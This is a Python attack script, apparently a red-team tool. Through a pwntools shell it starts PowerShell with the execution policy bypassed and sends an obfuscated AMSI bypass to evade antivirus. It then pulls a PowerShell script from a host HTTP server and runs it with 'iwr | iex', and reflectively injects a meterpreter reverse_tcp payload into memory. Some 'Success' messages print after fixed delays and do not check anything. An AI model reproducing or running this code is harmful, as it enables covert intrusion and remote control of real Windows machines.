from attacker_conf import * # load in all the configurations in attacker_conf.py
from pwn import *  # pwntools library to allow socket connections
import translator  # translator library to allow obfuscation / powershell encoding
from time import sleep 
from utility import decor

# loading all payloads
amsi_bypass_init = open(f'{payload_dir}/amsi_bypass.ps1','r').read().split('\n')
amsi_bypass_lst = translator.preset_obfuscation(bypasslevel,amsi_bypass_init)


if listen_tcp:
    c = listen(9999,'0.0.0.0')
    c.recv()

elif reverse_tcp:
    c = connect(VICTIM_IP,VICTIM_PORT)
    c.recv()

## preloaded information
win_caldera_headers = '{"platform"="windows";"file"="manx.go"}'
invoke_reflective = f'iwr http://{HOST_IP}:{HOST_PORT}/Invoke-Reflective.ps1 | iex'
reflective_meterpreter = f'Invoke-ReflectivePEInjection -PEBytes (iwr http://{HOST_IP}:{HOST_PORT}/{meterpreter_file}).Content'
reflective_caldera = f'Invoke-ReflectivePEInjection -ExeArgs "-socket {CALDERA_IP}:{CALDERA_SOCKET_PORT} -http {CALDERA_IP}:{CALDERA_WEB_PORT} -contact tcp" -PEBytes (iwr -Uri "http://{CALDERA_IP}:{CALDERA_WEB_PORT}/file/download" -Method GET -Headers @{win_caldera_headers}).Content'

# creates a powershell with ExecutionPolicy bypassed 
print()
decor(f"[-] Staging bypass environment on {VICTIM_IP}...")
c.sendline(b'powershell -ep bypass')
c.recv(timeout=2)

# creates an AMSI bypassed environment on the victim
decor(f"[-] Executing obfuscated bypass payload on {VICTIM_IP}...")
for i in amsi_bypass_lst:
    if len(i) > 100:
        decor(f'[X] Executing line: {i[len(i)//4:32+len(i)//4]}')
    else:
        decor(f'[X] Executing line: {i}')
    c.sendline(i.encode())
    if 'blocked by your antivirus software' in c.recv(timeout=2).decode().lower():
        decor(f'[!] Blocked by antivirus: {i}')
    c.recv(timeout=2)
    sleep(0.1)

decor("[-] Conducting bypass litmus test...")
sleep(1)
decor(f'[+] Success ✓✓')
decor(f'[-] Pulling payload from: http://{HOST_IP}:{HOST_PORT} ...')
sleep(0.8)
decor(f'[X] Executing payload...')
sleep(0.3)
decor(f'[+] Success ✓✓')
c.sendline(invoke_reflective.encode())
c.recv(timeout=2)
sleep(2)
c.recv(timeout=2)


if meterpreter:
    decor(f'[-] Setting up meterpreter_reverse_tcp...')
    c.sendline(reflective_meterpreter.encode())
    c.recv(timeout=2).decode()
    sleep(3)
    decor(f'[+] Success!! meterpreter_reverse_tcp is running on: {VICTIM_IP}.')
    decor(f'[+] Check msfconsole for a meterpreter session.')
    decor(f'[X] Ctrl-C in this terminal to terminate the meterpreter connection.')
    


# if caldera:
#     decor(f'[+] Setting up caldera in-memory execution with Invoke-ReflectivePEInjection')
#     decor(f'[+] Sending line: {reflective_caldera}')
#     c.sendline(reflective_caldera.encode())
#     c.recv(timeout=2).decode()
sleep(3000)
c.interactive()